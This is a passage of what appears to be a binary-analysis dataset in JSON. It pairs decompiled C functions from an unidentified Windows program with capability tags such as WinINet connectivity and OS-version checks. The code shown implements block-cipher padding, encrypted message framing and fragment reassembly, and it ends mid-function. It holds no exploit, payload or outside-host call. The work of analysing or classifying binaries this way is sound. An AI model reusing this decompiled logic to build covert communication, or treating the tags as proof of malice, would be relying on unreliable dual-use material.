        "decompiled_code": "\nint32_t __cdecl fcn.0006eee0(int32_t arg_8h, uint arg_ch, uint32_t arg_10h, uint arg_14h)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    int32_t var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    char *var_8h;\n    int32_t var_4h;\n    \n    var_ach = fcn.0006f480(arg_8h);\n    if (var_ach == 0) {\n        if (arg_10h < 1) {\n            if (arg_10h == 0) {\n                var_ach = fcn.000767a0(*(arg_8h + 4), arg_ch, 0, arg_14h);\n            }\n            else {\n                var_ach = 0x21590068;\n            }\n        }\n        else {\n            puVar1 = *(arg_8h + 0x1c);\n            var_a8h = *puVar1;\n            var_a4h = puVar1[1];\n            var_98h = puVar1[2];\n            var_94h = puVar1[3];\n            var_a0h = var_a8h;\n            var_9ch = var_a4h;\n            fcn.000317c0(&var_90h, 0x10, &var_a0h);\n            var_8h = fcn.000356c0(arg_10h + 9);\n            if (var_8h == NULL) {\n                var_ach = 0x21590004;\n            }\n            else {\n                fcn.00030ca0(arg_ch, var_8h + 1, arg_10h, &var_90h, &var_a8h, 1);\n                uVar2 = arg_10h & 0x80000007;\n                if (uVar2 < 0) {\n                    uVar2 = (uVar2 - 1 | 0xfffffff8) + 1;\n                }\n                var_4h = (-(uVar2 != 0) & 8) + (arg_10h + (arg_10h >> 0x1f & 7U) >> 3) * 8;\n                *var_8h = var_4h - arg_10h;\n                var_ach = fcn.000767a0(*(arg_8h + 4), var_8h, var_4h + 1, arg_14h);\n                fcn.000357f0(var_8h);\n            }\n        }\n    }\n    return var_ach;\n}\n",
        "token_count": 622
    },
    "0006f060": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0006f060(int32_t arg_8h, int32_t *arg_ch, int32_t *arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t var_ach;\n    uint8_t *var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    int32_t var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    \n    var_ach = fcn.0006f480(arg_8h);\n    if ((var_ach == 0) && (var_ach = fcn.00076860(*(arg_8h + 4), &var_a8h, &var_9ch, arg_14h, arg_18h),  var_ach == 0))\n    {\n        if (var_9ch == 0) {\n            *arg_ch = 0;\n            *arg_10h = 0;\n            var_ach = 0;\n        }\n        else if (var_9ch < 9) {\n            var_ach = 0x2159012d;\n        }\n        else {\n            puVar1 = *(arg_8h + 0x1c);\n            var_a4h = *puVar1;\n            var_a0h = puVar1[1];\n            var_90h = puVar1[2];\n            var_8ch = puVar1[3];\n            var_98h = var_a4h;\n            var_94h = var_a0h;\n            fcn.000317c0(&var_88h, 0x10, &var_98h);\n            iVar2 = fcn.000356c0(var_9ch);\n            *arg_ch = iVar2;\n            if (*arg_ch == 0) {\n                var_ach = 0x21590004;\n            }\n            else {\n                fcn.00030ca0(var_a8h + 1, *arg_ch, var_9ch + -1, &var_88h, &var_a4h, 0);\n                *arg_10h = (var_9ch + -1) - *var_a8h;\n            }\n            fcn.00076a80(*(arg_8h + 4), var_a8h);\n        }\n    }\n    return var_ach;\n}\n",
        "token_count": 555
    },
    "0006f1f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.0006f1f0(int32_t arg_8h, uint arg_ch, uint32_t arg_10h, int32_t *arg_14h, int32_t *arg_18h, uint arg_1ch, \n            uint arg_20h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t var_b4h;\n    uint8_t *var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    int32_t var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    char *var_8h;\n    int32_t var_4h;\n    \n    var_b4h = fcn.0006f480(arg_8h);\n    if (var_b4h == 0) {\n        if (arg_10h < 1) {\n            var_8h = NULL;\n            var_4h = 0;\n        }\n        else {\n            puVar1 = *(arg_8h + 0x1c);\n            var_ach = *puVar1;\n            var_a8h = puVar1[1];\n            var_98h = puVar1[2];\n            var_94h = puVar1[3];\n            var_a0h = var_ach;\n            var_9ch = var_a8h;\n            fcn.000317c0(&var_90h, 0x10, &var_a0h);\n            var_8h = fcn.000356c0(arg_10h + 9);\n            if (var_8h == NULL) {\n                return 0x21590004;\n            }\n            fcn.00030ca0(arg_ch, var_8h + 1, arg_10h, &var_90h, &var_ach, 1);\n            uVar3 = arg_10h & 0x80000007;\n            if (uVar3 < 0) {\n                uVar3 = (uVar3 - 1 | 0xfffffff8) + 1;\n            }\n            var_4h = (-(uVar3 != 0) & 8) + (arg_10h + (arg_10h >> 0x1f & 7U) >> 3) * 8;\n            *var_8h = var_4h - arg_10h;\n            var_4h = var_4h + 1;\n        }\n        var_b4h = fcn.00076970(*(arg_8h + 4), var_8h, var_4h, &var_b0h, &var_a4h, arg_1ch, arg_20h);\n        fcn.000357f0(var_8h);\n        if (var_b4h == 0) {\n            if (var_a4h == 0) {\n                *arg_14h = 0;\n                *arg_18h = 0;\n                var_b4h = 0;\n            }\n            else if (var_a4h < 9) {\n                var_b4h = 0x2159012d;\n            }\n            else {\n                puVar1 = *(arg_8h + 0x1c);\n                var_ach = *puVar1;\n                var_a8h = puVar1[1];\n                var_98h = puVar1[2];\n                var_94h = puVar1[3];\n                var_a0h = var_ach;\n                var_9ch = var_a8h;\n                fcn.000317c0(&var_90h, 0x10, &var_a0h);\n                iVar2 = fcn.000356c0(var_a4h);\n                *arg_14h = iVar2;\n                if (*arg_14h == 0) {\n                    var_b4h = 0x21590004;\n                }\n                else {\n                    fcn.00030ca0(var_b0h + 1, *arg_14h, var_a4h + -1, &var_90h, &var_ach, 0);\n                    *arg_18h = (var_a4h + -1) - *var_b0h;\n                }\n                fcn.00076a80(*(arg_8h + 4), var_b0h);\n            }\n        }\n    }\n    return var_b4h;\n}\n",
        "token_count": 997
    },
    "0006f480": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0006f480(int32_t arg_8h)\n\n{\n    uint var_4h;\n    \n    if (*(arg_8h + 0x24) == 1) {\n        var_4h = 0;\n    }\n    else {\n        fcn.00034a10(arg_8h + 0x28);\n        if (*(arg_8h + 0x24) == 0) {\n            *(arg_8h + 0x1c) = arg_8h + 0xc;\n            *(arg_8h + 0x20) = 0x10;\n            *(arg_8h + 0x24) = 1;\n            var_4h = 0;\n        }\n        else if (*(arg_8h + 0x24) == 1) {\n            var_4h = 0;\n        }\n        else {\n            var_4h = 0x2159012d;\n        }\n        fcn.00034a80(arg_8h + 0x28);\n    }\n    return var_4h;\n}\n",
        "token_count": 241
    },
    "0006f500": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0006f500(int32_t arg_8h, int32_t arg_ch, uint arg_10h, int32_t arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t var_8h;\n    uint var_4h;\n    \n    if (arg_ch == 1) {\n        if (arg_14h == 0x10) {\n            fcn.00078be8(arg_8h + 0x30, arg_10h, 0x10);\n            var_8h = 0;\n        }\n        else {\n            var_8h = 0x21590064;\n        }\n    }\n    else {\n        var_8h = 0;\n    }\n    iVar1 = fcn.00076b10(*(arg_8h + 4), arg_ch, arg_10h, arg_14h, arg_18h);\n    if (var_8h != 0) {\n        iVar1 = var_8h;\n    }\n    return iVar1;\n}\n",
        "token_count": 236
    },
    "0006f580": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0006f580(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.0006f480(arg_8h);\n    if ((iVar1 == 0) && (iVar1 = fcn.0006f5f0(arg_8h, arg_ch, &var_8h, &var_4h),  iVar1 == 0)) {\n        iVar1 = fcn.000767a0(*(arg_8h + 4), var_8h, var_4h, arg_10h);\n        fcn.000357f0(var_8h);\n    }\n    return iVar1;\n}\n",
        "token_count": 182
    },
    "0006f5f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0006f5f0(int32_t arg_8h, uint *arg_ch, char **arg_10h, int32_t *arg_14h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    uint var_c0h;\n    uint var_b8h;\n    uint var_b4h;\n    uint *var_b0h;\n    uint32_t var_ach;\n    int32_t var_a8h;\n    int32_t var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    char *var_8h;\n    int32_t var_4h;\n    \n    var_a8h = 0;\n    for (var_b0h = arg_ch; var_b0h != NULL; var_b0h = *var_b0h) {\n        var_a8h = var_a8h + var_b0h[2];\n    }\n    if (var_a8h == 0) {\n        *arg_10h = NULL;\n        *arg_14h = 0;\n        uVar2 = 0;\n    }\n    else {\n        puVar1 = *(arg_8h + 0x1c);\n        var_b8h = *puVar1;\n        var_b4h = puVar1[1];\n        var_98h = puVar1[2];\n        var_94h = puVar1[3];\n        var_a0h = var_b8h;\n        var_9ch = var_b4h;\n        fcn.000317c0(&var_90h, 0x10, &var_a0h);\n        var_8h = fcn.000356c0(var_a8h + 9);\n        if (var_8h == NULL) {\n            uVar2 = 0x21590004;\n        }\n        else {\n            var_4h = 1;\n            var_ach = 0;\n            var_b0h = arg_ch;\n            var_a4h = 0;\n            while (var_b0h != NULL) {\n                if (8 - var_ach < var_b0h[2] - var_a4h) {\n                    fcn.00078be8(&var_c0h + var_ach, var_b0h[1] + var_a4h, 8 - var_ach);\n                    var_a4h = (8 - var_ach) + var_a4h;\n                    var_ach = 8;\n                }\n                else {\n                    fcn.00078be8(&var_c0h + var_ach, var_b0h[1] + var_a4h, var_b0h[2] - var_a4h);\n                    var_ach = (var_b0h[2] - var_a4h) + var_ach;\n                    var_b0h = *var_b0h;\n                    var_a4h = 0;\n                }\n                if ((var_ach == 8) || (var_b0h == NULL)) {\n                    fcn.00030ca0(&var_c0h, var_8h + var_4h, var_ach, &var_90h, &var_b8h, 1);\n                    while( true ) {\n                        uVar3 = var_ach & 0x80000007;\n                        if (uVar3 < 0) {\n                            uVar3 = (uVar3 - 1 | 0xfffffff8) + 1;\n                        }\n                        if (uVar3 == 0) break;\n                        var_ach = var_ach + 1;\n                    }\n                    var_4h = var_4h + var_ach;\n                    var_ach = 0;\n                }\n            }\n            *var_8h = (var_4h + -1) - var_a8h;\n            *arg_10h = var_8h;\n            *arg_14h = var_4h;\n            uVar2 = 0;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 904
    },
    "0006f8a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.0006f8a0(int32_t arg_8h, uint arg_ch, int32_t *arg_10h, int32_t *arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t var_b4h;\n    uint8_t *var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    int32_t var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8h;\n    uint var_4h;\n    \n    var_b4h = fcn.0006f480(arg_8h);\n    if ((var_b4h == 0) && (var_b4h = fcn.0006f5f0(arg_8h, arg_ch, &var_8h, &var_4h),  var_b4h == 0)) {\n        var_b4h = fcn.00076970(*(arg_8h + 4), var_8h, var_4h, &var_b0h, &var_a4h, arg_18h, arg_1ch);\n        fcn.000357f0(var_8h);\n        if (var_b4h == 0) {\n            if (var_a4h == 0) {\n                *arg_10h = 0;\n                *arg_14h = 0;\n                var_b4h = 0;\n            }\n            else if (var_a4h < 9) {\n                var_b4h = 0x2159012d;\n            }\n            else {\n                puVar1 = *(arg_8h + 0x1c);\n                var_ach = *puVar1;\n                var_a8h = puVar1[1];\n                var_98h = puVar1[2];\n                var_94h = puVar1[3];\n                var_a0h = var_ach;\n                var_9ch = var_a8h;\n                fcn.000317c0(&var_90h, 0x10, &var_a0h);\n                iVar2 = fcn.000356c0(var_a4h);\n                *arg_10h = iVar2;\n                if (*arg_10h == 0) {\n                    var_b4h = 0x21590004;\n                }\n                else {\n                    fcn.00030ca0(var_b0h + 1, *arg_10h, var_a4h + -1, &var_90h, &var_ach, 0);\n                    *arg_14h = (var_a4h + -1) - *var_b0h;\n                }\n                fcn.00076a80(*(arg_8h + 4), var_b0h);\n            }\n        }\n    }\n    return var_b4h;\n}\n",
        "token_count": 661
    },
    "0006fa70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.0006fa70(int32_t *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    int32_t iVar1;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.000356c0(0x38);\n    if (var_4h == 0) {\n        iVar1 = 0x21590004;\n    }\n    else {\n        fcn.00078bfa(var_4h, 0, 0x38);\n        var_ch = arg_ch;\n        var_8h = 0;\n        iVar1 = fcn.00075eb0(var_4h + 4, &var_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n        if (iVar1 == 0) {\n            *(var_4h + 0x10) = 0;\n            *(var_4h + 0xc) = 0x1000000;\n            fcn.000349b0(var_4h + 0x2c);\n            fcn.000349b0(var_4h + 0x30);\n            *arg_8h = var_4h;\n        }\n        else {\n            fcn.000357f0(var_4h);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 346
    },
    "0006fb50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0006fb50(int32_t arg_8h)\n\n{\n    uint *var_4h;\n    \n    fcn.000349e0(arg_8h + 0x2c);\n    fcn.000349e0(arg_8h + 0x30);\n    for (var_4h = *(arg_8h + 0x34); var_4h != NULL; var_4h = *var_4h) {\n        fcn.000357f0(var_4h[1]);\n    }\n    fcn.00070b70(*(arg_8h + 0x34));\n    fcn.000357f0(arg_8h);\n    return;\n}\n",
        "token_count": 157
    },
    "0006fbc0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0006fbc0(uint32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_28h;\n    uint *var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.00076560(*(arg_8h + 4), arg_ch);\n    if ((iVar1 == 0) && (*(arg_8h + 8) = 1,  *(arg_8h + 0x28) != 0)) {\n        var_4h._0_1_ = 1;\n        var_4h._1_2_ = fcn.00035980(arg_8h & 0xffff0000 | *(arg_8h + 0x28));\n        var_18h = 0;\n        var_14h = 0;\n        var_8h = 0;\n        var_20h = 0x80051a78;\n        var_1ch = 3;\n        var_24h = &var_14h;\n        var_10h = &var_4h;\n        var_ch = 3;\n        iVar1 = fcn.00076cb0(*(arg_8h + 4), &var_24h, 0);\n    }\n    return iVar1;\n}\n",
        "token_count": 348
    },
    "0006fc70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0006fc70(int32_t arg_8h, int32_t *arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar1 = fcn.000762e0(*(arg_8h + 4), &var_8h, arg_10h);\n    if (iVar1 == 0) {\n        var_4h = fcn.000356c0(0x38);\n        if (var_4h == 0) {\n            iVar1 = 0x21590004;\n        }\n        else {\n            fcn.00078bfa(var_4h, 0, 0x38);\n            *(var_4h + 4) = var_8h;\n            *(var_4h + 0xc) = *(arg_8h + 0xc);\n            *(var_4h + 0x10) = *(arg_8h + 0x10);\n            *(var_4h + 0x14) = *(arg_8h + 0x14);\n            *(var_4h + 0x18) = *(arg_8h + 0x18);\n            *(var_4h + 0x1c) = *(arg_8h + 0x1c);\n            *(var_4h + 0x20) = *(arg_8h + 0x20);\n            *(var_4h + 0x24) = *(arg_8h + 0x24);\n            fcn.000349b0(var_4h + 0x2c);\n            fcn.000349b0(var_4h + 0x30);\n            *(var_4h + 8) = 1;\n            *arg_ch = var_4h;\n            iVar1 = 0;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 434
    },
    "0006fd50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0006fd50(int32_t arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t **ppiVar3;\n    uint var_58h;\n    uint *var_54h;\n    uint8_t *var_50h;\n    uint var_4ch;\n    uint var_48h;\n    int32_t **var_44h;\n    uint var_40h;\n    int32_t *var_3ch;\n    int32_t *var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint *var_2ch;\n    uint *var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t **var_14h;\n    int32_t var_10h;\n    uint8_t var_9h;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    var_14h = NULL;\n    if (*(arg_8h + 8) == 0) {\n        var_30h = 0x21590003;\n    }\n    else {\n        if (*(arg_8h + 0x24) == 0) {\n            arg_ch = fcn.00070c80(arg_ch, arg_10h);\n            var_8h = arg_ch;\n            if (arg_ch == 0) {\n                return 0x21590004;\n            }\n        }\n        else {\n            var_8h = 0;\n        }\n        var_30h = fcn.000707e0(arg_8h, arg_ch, arg_10h, &var_14h, &var_18h);\n        if (var_30h == 0) {\n            if (var_18h < 0x7fff) {\n                if (var_18h < 0x10) {\n                    var_1ch = 1;\n                    iVar1 = fcn.00078a6e();\n                    var_4h = iVar1 % 7 + 1;\n                    for (var_44h = var_14h; var_44h != NULL; var_44h = *var_44h) {\n                        var_44h[3] = var_4h;\n                        uVar2 = fcn.00078a6e();\n                        uVar2 = uVar2 & 0x80000007;\n                        if (uVar2 < 0) {\n                            uVar2 = (uVar2 - 1 | 0xfffffff8) + 1;\n                        }\n                        var_4h = var_4h + uVar2 + 1;\n                    }\n                }\n                else if (var_18h < 0x7f) {\n                    var_1ch = 1;\n                    var_4h = 0x1;\n                    for (var_44h = var_14h; var_44h != NULL; var_44h = *var_44h) {\n                        var_44h[3] = var_4h;\n                        var_4h = var_4h + 1;\n                    }\n                }\n                else if (var_18h < 0x100) {\n                    var_1ch = 0;\n                    uVar2 = fcn.00078a6e();\n                    uVar2 = uVar2 & 0x8000007f;\n                    if (uVar2 < 0) {\n                        uVar2 = (uVar2 - 1 | 0xffffff80) + 1;\n                    }\n                    var_4h = uVar2 + 1;\n                    for (var_44h = var_14h; var_44h != NULL; var_44h = *var_44h) {\n                        var_44h[3] = var_4h;\n                        uVar2 = fcn.00078a6e();\n                        uVar2 = uVar2 & 0x8000007f;\n                        if (uVar2 < 0) {\n                            uVar2 = (uVar2 - 1 | 0xffffff80) + 1;\n                        }\n                        var_4h = var_4h + uVar2 + 1;\n                    }\n                }\n                else {\n                    var_1ch = 0;\n                    var_4h = 0x1;\n                    for (var_44h = var_14h; var_44h != NULL; var_44h = *var_44h) {\n                        var_44h[3] = var_4h;\n                        var_4h = var_4h + 1;\n                    }\n                }\n                fcn.00070990(var_14h, var_18h);\n                var_54h = NULL;\n                var_50h = NULL;\n                var_4ch = 0;\n                var_48h = 0;\n                var_2ch = NULL;\n                var_28h = NULL;\n                var_24h = 0;\n                var_20h = 0;\n                var_40h = 0;\n                var_3ch = NULL;\n                var_38h = NULL;\n                var_34h = 0;\n                var_30h = 0;\n                fcn.00034a10(arg_8h + 0x2c);\n                var_44h = var_14h;\n                var_10h = 0;\n                do {\n                    while( true ) {\n                        if (var_44h == NULL) goto code_r0x0007013e;\n                        if (var_1ch == 0) {\n                            var_9h = 0xff;\n                            var_58h._0_2_ = *(var_44h + 3);\n                            ppiVar3 = var_44h;\n                            if (*var_44h == NULL) {\n                                ppiVar3 = var_58h | 0x8000;\n                                var_58h._0_2_ = ppiVar3;\n                            }\n                            var_50h = &var_9h;\n                            var_4ch = 1;\n                            var_54h = &var_2ch;\n                            var_58h._0_2_ = fcn.00035980(ppiVar3 & 0xffff0000 | var_58h);\n                            var_28h = &var_58h;\n                            var_24h = 2;\n                            var_2ch = &var_40h;\n                            var_3ch = var_44h[1];\n                            var_38h = var_44h[2];\n                        }\n                        else {\n                            var_9h = *(var_44h + 3);\n                            if (*var_44h == NULL) {\n                                var_9h = var_9h | 0x80;\n                            }\n                            var_50h = &var_9h;\n                            var_4ch = 1;\n                            var_54h = &var_40h;\n                            var_3ch = var_44h[1];\n                            var_38h = var_44h[2];\n                        }\n                        if (*(arg_8h + 0xc) < var_44h[2]) {\n                            var_30h = 0x2159000b;\n                        }\n                        else {\n                            var_30h = fcn.00076cb0(*(arg_8h + 4), &var_54h, arg_14h);\n                            if ((var_30h != 0) && (var_30h != 0x2159000b)) {\n                                if (var_44h != var_14h) {\n                                    *(arg_8h + 8) = 0;\n                                }\n                                goto code_r0x0007013e;\n                            }\n                        }\n                        if (var_30h == 0x2159000b) break;\n                        if (*(arg_8h + 0x10) < var_44h[2]) {\n                            *(arg_8h + 0x10) = var_44h[2];\n                        }\n                        var_44h = *var_44h;\n                        var_10h = var_10h + 1;\n                    }\n                    if (*(arg_8h + 0xc) == *(arg_8h + 0x10)) {\n                        *(arg_8h + 0x10) = 0;\n                    }\n                    else if (var_44h[2] < *(arg_8h + 0xc)) {\n                        *(arg_8h + 0xc) = var_44h[2];\n                    }\n                    var_30h = fcn.00070a30(arg_8h, var_44h);\n                } while (var_30h == 0);\n                if (var_44h != var_14h) {\n                    *(arg_8h + 8) = 0;\n                }\ncode_r0x0007013e:\n                fcn.00034a80(arg_8h + 0x2c);\n                fcn.00070b70(var_14h);\n                fcn.000357f0(var_8h);\n            }\n            else {\n                fcn.00070b70(var_14h);\n                var_30h = 0x2159000b;\n            }\n        }\n        else {\n            fcn.000357f0(var_8h);\n        }\n    }\n    return var_30h;\n}\n",
        "token_count": 2095
    },
    "00070170": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00070170(int32_t arg_8h, int32_t *arg_ch, uint32_t *arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint16_t uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    uint *var_24h;\n    uint8_t *var_20h;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    int32_t var_14h;\n    uint *var_10h;\n    uint32_t var_ch;\n    uint *var_8h;\n    uint var_1h;\n    \n    var_20h = NULL;\n    if (*(arg_8h + 8) == 0) {\n        var_28h = 0x21590003;\n    }\n    else {\n        *arg_ch = 0;\n        fcn.00034a10(arg_8h + 0x30);\n        var_8h = *(arg_8h + 0x34);\n        *(arg_8h + 0x34) = 0;\n        var_14h = 0;\n        while (var_28h = fcn.00076860(*(arg_8h + 4), &var_20h, &var_ch, arg_14h, arg_18h),  var_28h == 0) {\n            if (var_ch == 0) {\n                *(arg_8h + 8) = 0;\n                var_28h = 0x2159000a;\n                goto code_r0x0007045a;\n            }\n            var_18h = 0;\n            var_1h._0_1_ = *var_20h;\n            if (var_1h == 0xff) {\n                if (var_ch < 3) {\n                    *(arg_8h + 8) = 0;\n                    var_28h = 0x2159000a;\n                    goto code_r0x0007045a;\n                }\n                uVar1 = fcn.00035980(var_20h & 0xffff0000 | *(var_20h + 1));\n                var_18h = (uVar1 & 0x8000) != 0;\n                var_1ch = uVar1 & 0x7fff;\n                var_2ch = 3;\n                if (uVar1 != 0xffff) goto code_r0x00070319;\n                iVar3 = fcn.00071000(arg_8h, var_20h + 3, var_ch - 3);\n                if (iVar3 == 0) {\n                    var_28h = 0x2159000a;\n                    goto code_r0x0007045a;\n                }\n                fcn.00076a80(*(arg_8h + 4), var_20h);\n            }\n            else {\n                var_18h = (var_1h & 0x80) != 0;\n                var_1ch = var_1h & 0x7f;\n                var_2ch = 1;\ncode_r0x00070319:\n                if ((var_8h == NULL) || (var_8h[3] != var_1ch)) {\n                    var_10h = fcn.000356c0(0x10);\n                    if (var_10h == NULL) {\n                        var_28h = 0x21590004;\n                        goto code_r0x0007045a;\n                    }\n                    *var_10h = 0;\n                    var_10h[1] = 0;\n                    var_10h[2] = 0;\n                    var_10h[3] = 0;\n                    uVar2 = fcn.000356c0(var_ch - var_2ch);\n                    var_10h[1] = uVar2;\n                    if (var_10h[1] == 0) {\n                        fcn.000357f0(var_10h);\n                        var_28h = 0x21590004;\n                        goto code_r0x0007045a;\n                    }\n                    var_10h[2] = var_ch - var_2ch;\n                    var_10h[3] = var_1ch;\n                    fcn.00078be8(var_10h[1], var_20h + var_2ch, var_ch - var_2ch);\n                    *var_10h = var_8h;\n                    var_8h = var_10h;\n                }\n                else {\n                    iVar3 = fcn.00057d40(var_8h + 1, var_8h[2], (var_ch - var_2ch) + var_8h[2]);\n                    if (iVar3 != 0) {\n                        var_28h = 0x21590004;\n                        goto code_r0x0007045a;\n                    }\n                    fcn.00078be8(var_8h[1] + var_8h[2], var_20h + var_2ch, var_ch - var_2ch);\n                    var_8h[2] = (var_ch - var_2ch) + var_8h[2];\n                }\n                if (var_18h != 0) goto code_r0x0007045a;\n                fcn.00076a80(*(arg_8h + 4), var_20h);\n                var_20h = NULL;\n            }\n            var_14h = var_14h + 1;\n        }\n        if (var_28h == 0x21590002) {\n            *(arg_8h + 0x34) = var_8h;\n            var_8h = NULL;\n        }\ncode_r0x0007045a:\n        fcn.00034a80(arg_8h + 0x30);\n        fcn.00076a80(*(arg_8h + 4), var_20h);\n        if (var_28h == 0) {\n            fcn.00070ba0(var_8h);\n            var_ch = 0;\n            for (var_24h = var_8h; var_24h != NULL; var_24h = *var_24h) {\n                var_ch = var_ch + var_24h[2];\n            }\n            iVar3 = fcn.000356c0(var_ch);\n            *arg_ch = iVar3;\n            if (*arg_ch == 0) {\n                var_28h = 0x21590004;\n            }\n            else {\n                var_ch = 0;\n                for (var_24h = var_8h; var_24h != NULL; var_24h = *var_24h) {\n                    fcn.00078be8(*arg_ch + var_ch, var_24h[1], var_24h[2]);\n                    var_ch = var_ch + var_24h[2];\n                }\n                if ((*(arg_8h + 0x24) 